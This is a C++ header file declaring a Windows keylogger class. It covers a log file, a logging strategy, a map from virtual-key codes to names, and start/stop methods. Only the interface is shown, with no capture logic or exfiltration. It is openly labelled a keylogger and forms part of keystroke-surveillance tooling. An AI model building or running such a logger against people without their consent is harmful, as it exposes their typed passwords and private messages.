#ifndef FRIENDLY_KEYLOGGER
#define FRIENDLY_KEYLOGGER

#ifdef _WIN32

#include <windows.h>
#include <fstream>
#include <string>
#include <unordered_map>
#include "LogStrategy.h"

#define IS_PRESSED -32767 // -((2^15) - 1) 
#define START_KEY 8 // ascii code for backspace
#define END_KEY 237 // some greek letter
#define RELEVANT_INTERVAL_OF_KEYS (START_KEY END_KEY)
#define PAUSE 10

class KeyLogger 
{
    private:
        LogStrategy* logStrategy;  // implement the logging strategy
        std::ofstream logfile;     // Output file stream for logging
        bool running;              // Flag to indicate if the keylogger is on
        // The special keystrokes
        const std::unordered_map<int, std::string> keyname
        { 
            {VK_BACK, "[BACKSPACE]" },
            {VK_RETURN, "\n" },
            {VK_SPACE, "_" },
            {VK_TAB, "[TAB]" },
            {VK_SHIFT, "[SHIFT]" },
            {VK_LSHIFT, "[LSHIFT]" },
            {VK_RSHIFT, "[RSHIFT]" },
            {VK_CONTROL, "[CONTROL]" },
            {VK_LCONTROL, "[LCONTROL]" },
            {VK_RCONTROL, "[RCONTROL]" },
            {VK_MENU, "[ALT]" },
            {VK_LWIN, "[LWIN]" },
            {VK_RWIN, "[RWIN]" },
            {VK_ESCAPE, "[ESCAPE]" },
            {VK_END, "[END]" },
            {VK_HOME, "[HOME]" },
            {VK_LEFT, "[LEFT]" },
            {VK_RIGHT, "[RIGHT]" },
            {VK_UP, "[UP]" },
            {VK_DOWN, "[DOWN]" },
            {VK_PRIOR, "[PG_UP]" },
            {VK_NEXT, "[PG_DOWN]" },
            {VK_OEM_PERIOD, "." },
            {VK_DECIMAL, "." },
            {VK_OEM_PLUS, "+" },
            {VK_OEM_MINUS, "-" },
            {VK_ADD, "+" },
            {VK_SUBTRACT, "-" },
            {VK_CAPITAL, "[CAPSLOCK]" },
        };

    public:
        // Constructor
        KeyLogger();

        // Destructor
        ~KeyLogger();

        // Sets the logging strategy
        void setLogStrategy(LogStrategy* strategy);

        // Opens the log file; returns true if successful, false otherwise
        bool openLogFile(const std::string &filename);

        // write in the log based on a specific strategy
        void logKey(char);

        // Starts the keylogger loop
        void start();

        // Stops the keylogger loop
        void stop();

        // Returns whether the keylogger is currently running
        bool isRunning() const;
};

#endif // _WIN32

#endif // FRIENDLY_KEYLOGGER
